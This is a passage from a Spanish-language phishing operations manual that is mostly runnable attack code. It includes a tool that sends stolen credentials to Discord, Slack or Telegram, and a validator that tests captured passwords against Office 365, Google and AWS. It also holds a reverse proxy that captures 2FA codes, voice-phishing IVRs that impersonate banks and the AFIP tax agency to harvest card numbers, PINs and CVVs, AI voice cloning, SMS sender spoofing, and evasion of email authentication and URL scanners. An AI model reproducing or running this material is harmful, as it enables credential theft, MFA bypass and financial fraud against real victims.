        "embeds": [{
            "title": "🔴 Credenciales Capturadas",
            "color": 15158332,  # Red
            "fields": [
                {"name": "📧 Email", "value": cred.get('username', '?'), "inline": True},
                {"name": "🔑 Password", "value": cred.get('password', '?'), "inline": True},
                {"name": "🔐 OTP", "value": cred.get('otp', 'N/A'), "inline": True},
                {"name": "🌐 IP", "value": cred.get('ip', '?'), "inline": True},
                {"name": "📍 Pais", "value": cred.get('country', '?'), "inline": True},
                {"name": "🕐 Hora", "value": str(datetime.now()), "inline": True}
            ],
            "footer": {"text": f"UA: {cred.get('ua', '?')[:50]}"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    requests.post(webhook_url, json=data)

# Crear webhook en Discord:
# Configuración del canal → Integraciones → Webhooks → Nuevo webhook
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/123456/XXXXX"
send_discord_alert(DISCORD_WEBHOOK, {
    'username': 'jperez@empresa.com',
    'password': 'Passw0rd2024!',
    'ip': '190.210.30.50',
    'country': 'Argentina',
    'ua': 'Chrome 119 Windows'
})
```

### 20.3 Slack Integration

```python
def send_slack_alert(webhook_url, cred):
    """Enviar alerta a Slack"""
    blocks = [
        {
            "type": "header",
            "text": {"type": "plain_text", "text": "🔴 Credenciales Capturadas"}
        },
        {
            "type": "section",
            "fields": [
                {"type": "mrkdwn", "text": f"*Email:*\n{cred.get('username', '?')}"},
                {"type": "mrkdwn", "text": f"*Password:*\n{cred.get('password', '?')}"}
            ]
        },
        {
            "type": "section",
            "fields": [
                {"type": "mrkdwn", "text": f"*IP:*\n{cred.get('ip', '?')}"},
                {"type": "mrkdwn", "text": f"*Pais:*\n{cred.get('country', '?')}"}
            ]
        },
        {
            "type": "context",
            "elements": [{"type": "mrkdwn", "text": f"🕐 {datetime.now()}"}]
        }
    ]
    requests.post(webhook_url, json={"blocks": blocks})
```

### 20.4 Credential Parsing y Validation Automática

```python
# validator.py — Validación automática de credenciales capturadas
import requests
import re
import json

class CredentialValidator:
    def __init__(self):
        self.valid = []
        self.invalid = []

    def check_o365(self, email, password):
        """Validar credenciales Office 365"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        try:
            # Obtener página de login
            r = session.get('https://login.microsoftonline.com/common/oauth2/authorize',
                          params={'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                                  'response_type': 'code',
                                  'redirect_uri': 'https://localhost'})

            # Extraer tokens
            ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', r.text)
            ppsx = re.search(r'name="PPSX"[^>]*value="([^"]+)"', r.text)

            if not ppft:
                return False, "No se pudo extraer PPFT"

            # Enviar credenciales
            data = {
                'login': email,
                'passwd': password,
                'PPFT': ppft.group(1),
                'PPSX': 'Passwd',
                'type': 11,
                'ctx': '2',
                'hpgid': 0,
                'pgid': 0
            }
            r = session.post(
                'https://login.microsoftonline.com/common/oauth2/authorize',
                data=data, allow_redirects=False
            )

            if r.status_code == 302:
                return True, "Credenciales validas!"
            elif 'InvalidPasswordString' in r.text:
                return False, "Password incorrecto"
            elif 'user not found' in r.text.lower():
                return False, "Usuario no encontrado"
            else:
                return None, "Requiere verificacion adicional (2FA?)"

        except Exception as e:
            return False, f"Error: {str(e)}"

    def check_google(self, email, password):
        """Validar credenciales Google"""
        session = requests.Session()
        try:
            # Paso 1: identificar cuenta
            r = session.get('https://accounts.google.com/ServiceLogin')
            r = session.post('https://accounts.google.com/_/signin/sl/lookup',
                           data={'Email': email, 'identifier': email})

            # Paso 2: enviar password
            r = session.post('https://accounts.google.com/_/signin/challenge/sl/password',
                           data={'Passwd': password, 'Email': email})

            if 'challenge' in r.text:
                return None, "Requiere 2FA"
            elif 'Signin' in r.text or 'myaccount' in r.text:
                return True, "Credenciales validas!"
            else:
                return False, "Credenciales invalidas"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def check_aws(self, access_key, secret_key):
        """Validar credenciales AWS"""
        try:
            import boto3
            client = boto3.client('sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key
            )
            identity = client.get_caller_identity()
            return True, f"AWS valido: {identity['Arn']}"
        except Exception as e:
            return False, f"AWS invalido: {str(e)}"

    def validate_all(self, creds_file):
        """Validar todas las credenciales del archivo"""
        with open(creds_file) as f:
            creds = [json.loads(line) for line in f]

        for cred in creds:
            username = cred.get('username', '')
            password = cred.get('password', '')

            if '@' in username and ('.com' in username or '.org' in username):
                print(f"Validando O365: {username}")
                valid, msg = self.check_o365(username, password)
            elif username.startswith('AKIA'):
                print(f"Validando AWS: {username}")
                valid, msg = self.check_aws(username, password)
            else:
                print(f"Validando Google: {username}")
                valid, msg = self.check_google(username, password)

            cred['valid'] = valid
            cred['validation_msg'] = msg

            if valid:
                self.valid.append(cred)
                print(f"  ✅ {msg}")
            else:
                self.invalid.append(cred)
                print(f"  ❌ {msg}")

        return {'valid': self.valid, 'invalid': self.invalid}
```

### 20.5 2FA Token Capture en Tiempo Real

```python
# phishing_2fa_capture.py — Captura de tokens 2FA con validación en tiempo real
import requests
import threading
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Configuración del reverse proxy hacia el servicio real
REAL_SERVICE = "https://login.target.com"
SESSION = requests.Session()

# Base de datos temporal de sesiones
sessions = {}

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    """Proxy inverso que captura credenciales y OTP"""

    # Reenviar request al servicio real
    url = f"{REAL_SERVICE}/{path}"

    # Capturar headers
    headers = dict(request.headers)
    headers.pop('Host', None)
    headers.pop('Content-Length', None)

    # Reenviar con cookies capturadas
    resp = SESSION.request(
        method=request.method,
        url=url,
        headers=headers,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=True
    )

    # Buscar credenciales en el body del request
    if request.method == 'POST':
        body = request.get_data(as_text=True)
        username = extract_field(body, 'username') or extract_field(body, 'loginfmt') or extract_field(body, 'Email')
        password = extract_field(body, 'password') or extract_field(body, 'passwd') or extract_field(body, 'Passwd')
        otp = extract_field(body, 'otp') or extract_field(body, 'appsessionkey') or extract_field(body, 'totp')

        if username and password:
            cred = {
                'username': username,
                'password': password,
                'otp': otp or 'N/A',
                'ip': request.remote_addr,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'cookies': dict(resp.cookies),
                'session_cookies': dict(SESSION.cookies)
            }

            # Notificar
            send_telegram_alert(cred)

            # Si hay OTP, reenviar automáticamente al servicio real
            if otp:
                print(f"[2FA] OTP capturado: {otp} — reenviando al servicio real")
                # El OTP ya se reenvió porque hicimos proxy del POST

    return resp.content, resp.status_code, dict(resp.headers)

def extract_field(body, field_name):
    """Extraer campo de formulario del body"""
    import re
    patterns = [
        f'{field_name}=([^&]+)',
        f'"{field_name}":"([^"]+)"',
        f'name="{field_name}"[^>]*value="([^"]*)"'
    ]
    for pattern in patterns:
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def send_telegram_alert(cred):
    """Enviar alerta a Telegram"""
    msg = (f"🔴 CREDENCIALES + POSIBLE 2FA\n"
           f"📧 {cred['username']}\n🔑 {cred['password']}\n"
           f"🔐 {cred['otp']}\n🌐 {cred['ip']}")
    print(msg)
    # Acá iría el envío a Telegram real

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

---

## 21. [phishing](../raw/ph1sh1ng.md) Analysis y Metrics

### 21.1 Click-Through Rate Optimization

```bash
# Análisis de métricas de campañas anteriores
# Factores que afectan CTR:

# 1. Asunto del email: A/B testing
# Probar variantes:
# - "Actualización de seguridad" vs "Tu cuenta requiere verificación"
# - "Notificación importante" vs "Acción requerida"
# - "Documento compartido" vs "Invitación a reunión"

# 2. Horario de envío:
# - Lunes 10AM: tasa de apertura alta
# - Viernes 3PM: tasa de clics baja (la gente ya está en modo finde)
# - Mejor horario general: Martes-Jueves 9AM-11AM

# 3. Nombre del remitente:
# - "Soporte Técnico" > "admin@empresa.com"
# - "Departamento de IT" > "helpdesk@empresa.com"
# - Nombres reales de empleados > nombres genéricos

# 4. Personalización:
# - Con nombre: +30% CTR
# - Con empresa: +20% CTR
# - Con cargo: +15% CTR
# - Sin personalización: baseline

# 5. Links:
# - 1 link en el email: 40% CTR
# - 2 links: 35% CTR
# - 3+ links: 25% CTR
# - Botón > link texto: +50% CTR
```

### 21.2 A/B Testing de Plantillas

```python
# ab_testing.py — Sistema de A/B testing para phishing
import random
import json
from datetime import datetime

class PhishingABTest:
    def __init__(self, campaign_name):
        self.campaign_name = campaign_name
        self.variants = []
        self.results = {}

    def add_variant(self, name, subject, body_html, from_name):
        self.variants.append({
            'name': name,
            'subject': subject,
            'body': body_html,
            'from': from_name,
            'sent': 0,
            'opened': 0,
            'clicked': 0,
            'creds': 0
        })

    def assign_variant(self, target):
        """Asignar variante random a target"""
        variant = random.choice(self.variants)
        variant['sent'] += 1
        return variant

    def track_open(self, variant_name):
        for v in self.variants:
            if v['name'] == variant_name:
                v['opened'] += 1

    def track_click(self, variant_name):
        for v in self.variants:
            if v['name'] == variant_name:
                v['clicked'] += 1

    def track_cred(self, variant_name):
        for v in self.variants:
            if v['name'] == variant_name:
                v['creds'] += 1

    def get_winner(self):
        """Determinar qué variante ganó"""
        best = max(self.variants, key=lambda v: v['clicked'] / max(v['sent'], 1))
        return best

# Ejemplo de configuración A/B
test = PhishingABTest("Campaña IT Noviembre")

# Variante A: Urgencia
test.add_variant(
    name="A_Urgencia",
    subject="⚠️ ACCION REQUERIDA: Tu cuenta sera desactivada en 24hs",
    body_html="<p>Tu cuenta sera desactivada. Hace clic para mantenerla activa.</p>",
    from_name="Soporte IT"
)

# Variante B: Documento compartido
test.add_variant(
    name="B_Documento",
    subject="Nuevo documento compartido contigo - Revision de sueldo",
    body_html="<p>Recibiste un nuevo documento. Hace clic para revisarlo.</p>",
    from_name="Recursos Humanos"
)

# Variante C: Notificación de seguridad
test.add_variant(
    name="C_Seguridad",
    subject="Inicio de sesion detectado desde ubicacion desconocida",
    body_html="<p>Detectamos un login desde Rusia. Verifica tu cuenta.</p>",
    from_name="Departamento de Seguridad"
)

print(f"Variantes configuradas: {len(test.variants)}")
```

### 21.3 Geographic Targeting

```python
# geographic_targeting.py — Segmentación geográfica
import requests

class GeoCampaign:
    def __init__(self):
        self.targets_by_country = {}

    def classify_targets(self, targets):
        """Clasificar targets por país"""
        for target in targets:
            email = target['email']
            # Inferir país del dominio
            domain = email.split('@')[1].lower()

            # Dominios brasileños
            if domain.endswith('.br') or domain.endswith('.com.br'):
                country = 'BR'
            # Dominios argentinos
            elif domain.endswith('.ar') or domain.endswith('.com.ar'):
                country = 'AR'
            # Dominios mexicanos
            elif domain.endswith('.mx') or domain.endswith('.com.mx'):
                country = 'MX'
            # Dominios españoles
            elif domain.endswith('.es') or domain.endswith('.com.es'):
                country = 'ES'
            # Dominios chilenos
            elif domain.endswith('.cl') or domain.endswith('.com.cl'):
                country = 'CL'
            # Dominios colombianos
            elif domain.endswith('.co') or domain.endswith('.com.co'):
                country = 'CO'
            # Dominios peruanos
            elif domain.endswith('.pe') or domain.endswith('.com.pe'):
                country = 'PE'
            # Genéricos
            else:
                country = 'US/Global'

            if country not in self.targets_by_country:
                self.targets_by_country[country] = []
            self.targets_by_country[country].append(target)

        return self.targets_by_country

    def get_country_template(self, country):
        """Elegir plantilla según país"""
        templates = {
            'AR': {
                'theme': 'AFIP / ARCA',
                'bank': 'Banco Galicia / Santander / BBVA',
                'courier': 'Correo Argentino / Andreani',
                'gov': 'ANSES / AFIP'
            },
            'BR': {
                'theme': 'Receita Federal',
                'bank': 'Banco do Brasil / Itaú / Bradesco',
                'courier': 'Correios',
                'gov': 'Receita Federal / Caixa'
            },
            'MX': {
                'theme': 'SAT',
                'bank': 'Banamex / BBVA / Santander',
                'courier': 'Estafeta / DHL',
                'gov': 'SAT / IMSS'
            },
            'ES': {
                'theme': 'Agencia Tributaria',
                'bank': 'Santander / BBVA / CaixaBank',
                'courier': 'Correos / SEUR',
                'gov': 'Agencia Tributaria / Seguridad Social'
            }
        }
        return templates.get(country, {
            'theme': 'Generic',
            'bank': 'Generic Bank',
            'courier': 'Generic Courier',
            'gov': 'Generic Tax Agency'
        })

    def create_localized_template(self, country, template_type):
        """Crear template localizado"""
        info = self.get_country_template(country)

        if template_type == 'bank':
            return f"<p>⚠️ Su cuenta en {info['bank']} ha sido temporalmente bloqueada por actividad sospechosa.</p>"
        elif template_type == 'courier':
            return f"<p>📦 Su paquete de {info['courier']} esta retenido en aduana. Debe pagar $5.000 ARS para liberarlo.</p>"
        elif template_type == 'gov':
            return f"<p>💰 {info['gov']} le informa que tiene un pago pendiente de $45.000. Gestionelo aqui.</p>"
```

---

## 22. [vishing](../raw/ph1sh1ng.md#vishing) (Voice [phishing](../raw/ph1sh1ng.md)) — Setup Completo

### 22.1 Twilio Integration para Llamadas Automatizadas

```python
# vishing_twilio.py — Sistema completo de vishing con Twilio
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from flask import Flask, request, make_response
import random
import time

app = Flask(__name__)

TWILIO_SID = 'ACXXXXXXXXXXXXXXXXX'
TWILIO_TOKEN = 'your_token'
TWILIO_PHONE = '+12025551234'

client = Client(TWILIO_SID, TWILIO_TOKEN)

# IVR Flow para capturar datos
CAMPAIGNS = {
    'banco': {
        'name': 'Banco Nacional',
        'message': 'Hola, somos del departamento de seguridad del Banco Nacional. Hemos detectado un movimiento sospechoso en su cuenta.',
        'prompts': [
            'Por favor, ingrese su numero de documento',
            'Ingrese los ultimos 4 digitos de su tarjeta',
            'Ingrese su clave de 4 digitos',
        ],
        'fields': ['dni', 'tarjeta_4digitos', 'clave']
    },
    'afip': {
        'name': 'AFIP',
        'message': 'Hola, somos de AFIP. Tiene una deuda impositiva pendiente que debe regularizar urgentemente.',
        'prompts': [
            'Ingrese su CUIT sin guiones',
            'Ingrese su numero de tramite',
            'Ingrese su clave fiscal',
        ],
        'fields': ['cuit', 'tramite', 'clave_fiscal']
    }
}

@app.route('/voice', methods=['GET', 'POST'])
def voice():
    """IVR principal"""
    campaign = request.args.get('campaign', 'banco')
    step = int(request.args.get('step', 0))

    campaign_config = CAMPAIGNS[campaign]
    response = VoiceResponse()

    if step == 0:
        # Mensaje de bienvenida + primera pregunta
        response.say(campaign_config['message'], voice='alice', language='es-AR')
        response.pause(length=1)

    if step < len(campaign_config['prompts']):
        # Preguntar y capturar input
        gather = Gather(
            input='dtmf',
            timeout=10,
            num_digits=8,
            action=f'/capture?campaign={campaign}&step={step}',
            method='POST'
        )
        gather.say(campaign_config['prompts'][step], voice='alice', language='es-AR')
        response.append(gather)

        # Si no ingresa nada
        response.say('No hemos recibido su respuesta. Intentaremos contactarlo nuevamente.', voice='alice', language='es-AR')
    else:
        # Fin de la llamada
        response.say('Gracias por su atencion. Su caso sera procesado en las proximas 24 horas.', voice='alice', language='es-AR')
        response.hangup()

    return str(response)

@app.route('/capture', methods=['POST'])
def capture():
    """Capturar datos ingresados por la víctima"""
    campaign = request.args.get('campaign', 'banco')
    step = int(request.args.get('step', 0))
    digits = request.form.get('Digits', '')
    caller_id = request.form.get('Caller', '')
    city = request.form.get('FromCity', '')
    state = request.form.get('FromState', '')

    campaign_config = CAMPAIGNS[campaign]
    field_name = campaign_config['fields'][step]

    # Guardar en base de datos / archivo
    with open(f'vishing_data_{campaign}.txt', 'a') as f:
        f.write(f"{caller_id}|{city}|{state}|{field_name}|{digits}|{time.time()}\n")

    # Enviar a Telegram
    from bot_phishing import PhishingBot
    bot = PhishingBot("TOKEN", "CHAT_ID")
    bot.send(f"📞 Vishing - {campaign_config['name']}\n"
             f"📱 From: {caller_id}\n"
             f"📍 {city}, {state}\n"
             f"📝 {field_name}: {digits}")

    # Ir al siguiente paso
    next_step = step + 1
    response = VoiceResponse()
    response.redirect(f'/voice?campaign={campaign}&step={next_step}')
    return str(response)

@app.route('/start_campaign', methods=['POST'])
def start_campaign():
    """Iniciar campaña de llamadas masivas"""
    data = request.json
    campaign = data.get('campaign', 'banco')
    targets = data.get('targets', [])

    for target in targets:
        call = client.calls.create(
            url=f'https://tu-servidor.com/voice?campaign={campaign}',
            to=target,
            from_=TWILIO_PHONE,
            caller_id=target,  # Spoofing del CallerID
            machine_detection='DetectMessageEnd',
            machine_detection_timeout=5
        )
        print(f"Llamada iniciada: {call.sid} -> {target}")
        time.sleep(2)  # Delay entre llamadas

    return {'status': 'ok', 'total': len(targets)}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

### 22.2 Voice Cloning con IA (ElevenLabs)

```python
# voice_cloning.py — Clonación de voz para vishing
import requests
import json
import time

class VoiceCloner:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.elevenlabs.io/v1"

    def clone_voice(self, name, audio_files):
        """Clonar voz a partir de archivos de audio"""
        url = f"{self.base_url}/voices/add"
        headers = {'xi-api-key': self.api_key}

        files = []
        for i, audio_file in enumerate(audio_files):
            files.append((f'files', (f'sample_{i}.mp3', open(audio_file, 'rb'), 'audio/mpeg')))

        data = {
            'name': name,
            'labels': json.dumps({"accent": "argentinian", "gender": "male"}),
            'description': f"Voz clonada de {name}"
        }

        response = requests.post(url, headers=headers, data=data, files=files)
        voice_id = response.json().get('voice_id')
        print(f"Voz clonada: {name} -> ID: {voice_id}")
        return voice_id

    def generate_speech(self, voice_id, text, output_file):
        """Generar audio a partir de texto con voz clonada"""
        url = f"{self.base_url}/text-to-speech/{voice_id}"
        headers = {
            'xi-api-key': self.api_key,
            'Content-Type': 'application/json'
        }
        data = {
            'text': text,
            'model_id': 'eleven_multilingual_v2',
            'voice_settings': {
                'stability': 0.5,
                'similarity_boost': 0.75,
                'style': 0.3,
                'use_speaker_boost': True
            }
        }

        response = requests.post(url, headers=headers, json=data)
        with open(output_file, 'wb') as f:
            f.write(response.content)
        print(f"Audio generado: {output_file}")
        return output_file

    def create_vishing_script(self, victim_name, bank_name, amount):
        """Crear script personalizado para llamada"""
        script = f"""
        Hola, {victim_name}. Habla {bank_name}.
        Hemos detectado una compra sospechosa de ${amount} en MercadoLibre.
        Si no realizaste esta compra, presioná 1 para hablar con nuestro equipo de seguridad.
        Caso contrario, presioná 2 para autorizar el pago.
        """
        return script

# Uso:
cloner = VoiceCloner("TU_API_KEY_ELEVENLABS")

# Clonar voz de un ejecutivo bancario
voice_id = cloner.clone_voice("Ejecutivo Bancario", [
    "sample_1.mp3",  # Audios de ejemplo (mínimo 1 minuto total)
    "sample_2.mp3",
    "sample_3.mp3"
])

# Generar speech para vishing
script = cloner.create_vishing_script("Juan Pérez", "Banco Santander", "15000")
cloner.generate_speech(voice_id, script, "vishing_call.mp3")
```

### 22.3 Asterisk IVR Setup Completo

```bash
# /etc/asterisk/extensions.conf — Configuración completa de IVR para vishing

[general]
static=yes
writeprotect=no

[globals]
RECORDING_DIR=/var/lib/asterisk/sounds/custom
LOG_FILE=/var/log/asterisk/vishing.log

[default]
; Contexto principal - maneja llamadas entrantes
exten => _X.,1,NoOp(Llamada entrante de ${CALLERID(num)})
    same => n,Set(TIMESTAMP=${STRFTIME(${EPOCH},,%Y-%m-%d %H:%M:%S)})
    same => n,Set(LOG_ENTRY=${TIMESTAMP}|${CALLERID(num)}|${CALLERID(name)})
    same => n,System(echo "${LOG_ENTRY}|INICIO" >> ${LOG_FILE})
    
    ; Bienvenida
    same => n,Answer()
    same => n,Wait(1)
    same => n,Playback(custom/bienvenida) ; "Hola, somos el Banco Nacional..."
    
    ; Menú principal
    same => n,Read(OPCION,custom/menu-opciones,1) ; "Presione 1 para seguridad, 2 para promociones"
    
    ; Goto según opción
    same => n,GotoIf($["${OPCION}" = "1"]?seguridad,1)
    same => n,GotoIf($["${OPCION}" = "2"]?promociones,1)
    same => n,Goto(invalido,1)

[seguridad]
; Capturar datos de seguridad
exten => 1,1,NoOp(Inicio captura de datos - Seguridad)
    same => n,Playback(custom/alerta-seguridad) ; "Hemos detectado actividad sospechosa..."
    
    ; Capturar DNI
    same => n,Read(DNI,custom/ingrese-dni,8) ; "Ingrese su DNI"
    same => n,System(echo "${LOG_ENTRY}|DNI=${DNI}" >> ${LOG_FILE})
    
    ; Capturar tarjeta
    same => n,Read(TARJETA,custom/ingrese-tarjeta,16) ; "Ingrese su número de tarjeta"
    same => n,System(echo "${LOG_ENTRY}|TARJETA=${TARJETA}" >> ${LOG_FILE})
    
    ; Capturar PIN
    same => n,Read(PIN,custom/ingrese-pin,4) ; "Ingrese su PIN"
    same => n,System(echo "${LOG_ENTRY}|PIN=${PIN}" >> ${LOG_FILE})
    
    ; Capturar código de seguridad
    same => n,Read(CVV,custom/ingrese-cvv,4) ; "Ingrese el código de seguridad"
    same => n,System(echo "${LOG_ENTRY}|CVV=${CVV}" >> ${LOG_FILE})
    
    ; Transferir a "agente real"
    same => n,Playback(custom/procesando) ; "Procesando su solicitud..."
    same => n,Wait(2)
    same => n,Playback(custom/gracias) ; "Gracias, su caso será gestionado"
    same => n,Hangup()

[promociones]
; Template para phishing de promociones
exten => 1,1,NoOp(Promociones)
    same => n,Playback(custom/promocion) ; "Ganó un premio de $50,000..."
    same => n,Read(CODIGO,custom/ingrese-codigo,6)
    same => n,System(echo "${LOG_ENTRY}|CODIGO=${CODIGO}" >> ${LOG_FILE})
    same => n,Hangup()

[invalido]
exten => 1,1,NoOp(Opción inválida)
    same => n,Playback(custom/opcion-invalida)
    same => n,Hangup()
```

---

## 23. [smishing](../raw/ph1sh1ng.md#smishing) (SMS [phishing](../raw/ph1sh1ng.md)) Avanzado

### 23.1 Bulk SMS Gateways Comparación

```bash
# Comparación de servicios de SMS masivo:

# === Proveedores con API ===
# 1. Twilio - $0.0079/SMS (US), $0.04/SMS (LATAM)
#    API excelente, buena entregabilidad
#    Límites: hasta 100 SMS/segundo

# 2. AWS SNS - $0.00645/SMS (US)
#    Barato, buena integración con AWS
#    Límites: ajustables (default 20/día en sandbox)

# 3. Vonage (Nexmo) - $0.0050/SMS
#    Bueno para Europa, decente en LATAM
#    API REST simple

# 4. Plivo - $0.0050/SMS
#    Buen soporte LATAM, precios competitivos

# 5. ClickSend - $0.04/SMS
#    SMPP directo, alto volumen
#    Ideal para envíos masivos

# 6. BulkSMS - $0.03/SMS
#    SMPP, HTTP API
#    Muy usado en LATAM

# 7. RouteSMS (India) - $0.002/SMS
#    Muy barato, calidad variable
#    Ideal para grandes volúmenes

# 8. TextBelt (alternativa gratuita) - limitado
#    $0.10/SMS (caro pero sin verificación)
```

### 23.2 SMS Sender ID Spoofing

```bash
# === Técnicas de Spoofing de Sender ID ===

# 1. Alfanumérico (países que lo permiten)
# En vez de un número de teléfono, mostrás un nombre
# Ej: "BancoNacion", "AFIP", "Netflix", "MercadoPago"
# Países que lo soportan: Argentina, Chile, Colombia, España, UK

# 2. Spoofing de número (más difícil)
# Algunos gateways permiten setear cualquier remitente
# Twilio requiere verificación del número
# Gateways SMPP sin verificación permiten cualquier remitente

# 3. SMS Spoofing con SIM virtual
# Usar SIM cards virtuales con IMSI custom
# Técnica: Baseband SMS injection

# 4. US Short Codes (5-6 dígitos)
# Parecen más legítimos que números largos
# Costo: ~$500/mes + $1000 setup

# Ejemplo con Twilio sender ID alfanumérico:
from twilio.rest import Client

client = Client(ACCOUNT_SID, AUTH_TOKEN)

message = client.messages.create(
    body="Banco Nacion: Su tarjeta fue bloqueada. Active: http://bit.ly/falso",
    from_="BancoNacion",  # Sender ID alfanumérico
    to="+541112345678",
    messaging_service_sid=None,  # No usar messaging service si querés sender ID
)

# SMS spoofing via SMPP directo
# Usar smpplib para conectar a un SMSC
import smpplib

client = smpplib.client.Client('smsc.provider.com', 2775)
client.connect()
client.bind_transceiver(system_id='user', password='pass')

parts = smpplib.make_parts("Tu paquete está retenido. Pagá acá: http://bit.ly/falso")
for part in parts:
    pdu = smpplib.PDU(
        'submit_sm', 
        source_addr_ton=5,  # Alfanumérico
        source_addr_npi=0,
        source_addr='BancoNacion',  # Spoofed sender
        dest_addr_ton=1,
        dest_addr_npi=1,
        destination_addr='541112345678',
        short_message=part,
        registered_delivery=True,
    )
    client.send_pdu(pdu)

client.unbind()
client.disconnect()
```

### 23.3 SMS Delivery Tracking

```python
# sms_tracker.py — Seguimiento de entregabilidad de SMS

class SMSTracker:
    def __init__(self):
        self.delivery_status = {}

    def track_twilio(self, message_sid):
        """Rastrear estado de entrega de SMS via Twilio"""
        from twilio.rest import Client
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        message = client.messages(message_sid).fetch()
        status = {
            'sid': message_sid,
            'status': message.status,
            'error_code': message.error_code,
            'error_message': message.error_message,
            'price': message.price,
            'price_unit': message.price_unit,
            'date_sent': str(message.date_sent),
            'date_updated': str(message.date_updated)
        }
        self.delivery_status[message_sid] = status
        return status

    def track_via_callback(self):
        """Webhook para recibir delivery receipts"""
        from flask import Flask, request
        app = Flask(__name__)

        @app.route('/twilio_status', methods=['POST'])
        def twilio_status():
            data = request.form
            message_sid = data.get('MessageSid')
            status = data.get('MessageStatus')
            error_code = data.get('ErrorCode', '0')
            to = data.get('To', '')
            self.delivery_status[message_sid] = {
                'status': status,
                'error': error_code,
                'to': to,
                'time': data.get('EventTimestamp')
            }
            print(f"[SMS] {to} -> {status}")
            return 'OK'

        app.run(port=5000)

    def stats(self):
        """Estadísticas de entrega"""
        from collections import Counter
        statuses = Counter(s['status'] for s in self.delivery_status.values())
        total = len(self.delivery_status)
        return {
            'total': total,
            'delivered': statuses.get('delivered', 0),
            'failed': statuses.get('failed', 0),
            'undelivered': statuses.get('undelivered', 0),
            'sent': statuses.get('sent', 0),
            'delivery_rate': f"{statuses.get('delivered', 0) / max(total, 1) * 100:.1f}%"
        }
```

---

## 24. [phishing](../raw/ph1sh1ng.md) Defense Evasion

### 24.1 Email Authentication Spoofing (SPF/DKIM/DMARC Bypass)

```bash
# Técnicas avanzadas para bypassear SPF/DKIM/DMARC

# 1. SPF Bypass con subdominios comprometidos
# Si un subdominio de target.com no tiene SPF:
# Subdominios comunes sin SPF:
# test.target.com, mail.target.com, dev.target.com, beta.target.com
# Enviar desde test.target.com -> pasa SPF

# 2. DKIM Bypass con domain collision
# Si el dominio tiene DKIM selector "default" pero no "mail":
# Usar un selector que exista pero no tenga registro DNS
# El servidor receptor no encuentra el registro -> DKIM neutral

# 3. DMARC Bypass con p=none
# Si DMARC está en p=none (solo reporta, no bloquea)
# Aunque SPF y DKIM fallen, el email llega igual
# Verificar: dig _dmarc.target.com TXT

# 4. SPF Bypass con IPs incluídas
# Si target.com tiene: include:spf.protection.outlook.com
# Significa que todas las IPs de Office 365 pueden enviar como target.com
# Si comprometés una cuenta O365, podés enviar desde una IP de Microsoft
# que está en el SPF

# 5. DKIM Bypass con firma inválida
# Algunos servidores no verifican DKIM estrictamente
# Enviar con DKIM mal formado pero con header intacto

# 6. From Header Spoofing
# Diferencia entre envelope-from y header-from
# SPF verifica envelope-from (MAIL FROM)
# DMARC verifica header-from (From: header)
# Si son diferentes, algunos servidores pasan SPF pero no DMARC
# Técnica: envelope-from de dominio con SPF bueno
# header-from del dominio target
# Resultado: SPF pasa, DMARC depende de alignment

# Ejemplo de spoofing:
# MAIL FROM: <spoof@tudominio.com> (SPF válido acá)
# From: "Soporte" <soporte@target.com> (header que ve el usuario)
# Reply-To: spoof@tudominio.com (adonde va la respuesta)

# SMTP manual:
# HELO mail.tudominio.com
# MAIL FROM: <spoof@tudominio.com>
# RCPT TO: <victima@target.com>
# DATA
# From: "Soporte Target" <soporte@target.com>
# Reply-To: spoof@tudominio.com
# Subject: Urgente - Verifica tu cuenta
# ...
```

### 24.2 URL Scanning Services Evasion

```bash
# === Evasión de servicios que escanean URLs ===
# Google Safe Browsing, Microsoft SmartScreen, PhishTank, URLScan.io

# 1. URL Fingerprinting Evasion
# Los scanners toman screenshot de la URL
# Si detectan un login page, la marcan como phishing
# Usar cloaking (ver sección 13)

# 2. Redirect Chains
# URL → link legitimo (bit.ly) → redirect → phishing
# El scanner ve el bit.ly (legítimo), no la URL final
# Pero bit.ly también escanea... mejor con redirect propio

# 3. IP Rotation con CDN
# Usar Cloudflare, Fastly, Akamai como proxy
# La IP del servidor rotante evita bloqueos por IP

# 4. Domain Generation Algorithms (DGA)
# No usar el mismo dominio para todo
# Generar dominios dinámicamente:
# - login-XXXX.duckdns.org (XXXX rotativo)
# - verify-XXXX.serveo.net
# - check-XXXX.sytes.net

# 5. URL en imágenes (no texto)
# En vez de poner el link en texto del email,
# ponerlo como imagen de fondo o en un QR code

# 6. URL fragment encoding
# Los scanners no siempre interpretan:
# https://target.com@phishing.com  (user@host)
# https://target.com#phishing.com  (fragment)
# Lo ven como target.com pero el navegador va a phishing.com

# 7. Password-Protected Landing Page
# Si la landing page requiere una contraseña para verla:
# Los scanners no pueden pasar la autenticación
# La contraseña se la das a la víctima en el email

# 8. Time-Based URL Activation
# La URL solo sirve contenido malicioso después de X minutos
# Los scanners la ven vacía/legítima
# La víctima la ve horas después, ya activa
```

### 24.3 Browser Safe Browsing Evasion

```bash
# === Evasión de advertencias de navegadores ===

# Google Safe Browsing (Chrome):
# - Lista negra de URLs de phishing
# - Se actualiza cada 30 minutos
# - No se puede bypassear fácilmente

# Técnicas:
# 1. Dominios nuevos nunca listados (primeras 48hs)
# 2. URLs dinámicas con path random
# 3. Certificado SSL válido (aunque no evita safe browsing)
# 4. Evitar keywords: "login", "password", "verify", "secure" en la URL

# Microsoft SmartScreen (Edge, Outlook):
# - Reputación de dominio
# - Analysis de la página
